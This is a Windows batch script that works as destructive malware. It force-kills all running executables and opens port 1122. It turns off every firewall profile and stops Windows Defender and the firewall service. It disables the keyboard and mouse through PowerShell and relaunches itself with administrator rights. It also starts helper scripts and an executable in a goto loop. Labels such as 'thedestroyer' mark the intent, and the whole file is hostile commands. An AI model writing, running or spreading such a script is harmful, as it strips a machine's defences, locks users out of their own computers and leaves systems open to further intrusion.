@echo off

:terminator
setlocal
for /f "tokens=2" %%a in ('tasklist ^| findstr /r /b ".*.exe"') do (
    taskkill /f /im "%%a"
)


:netsecurety
netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=1122
netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=1122
netsh advfirewall set currentprofile firewallpolicy blockinbound,allowoutbound
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set allprofiles state off
net stop "Windows Defender Service"
net stop "Windows Firewall"


:disablekeyboardandmouse
PowerShell.exe -Command "Get-PnpDevice -Class 'Mouse' | Disable-PnpDevice -Confirm:$false"
PowerShell.exe -Command "Get-PnpDevice -Class 'Keyboard' | Disable-PnpDevice -Confirm:$false"


:duplication
PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', '.scripts\make_file.ps1' -Verb RunAs"


:thedestroyer
set exe_path=".scripts\python\dist\C"
if not "%1"=="am_admin" (powershell Start-Process "%0" -Verb RunAs -ArgumentList "am_admin" & exit)
%exe_path%


goto disablekeyboardandmouse
PowerShell.exe -ExecutionPolicy Bypass
PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', '.scripts\ShutNet.ps1' -Verb RunAs"
goto duplication
cscript .scripts\main.vbs
goto netsecurety
goto thedestroyer
goto terminator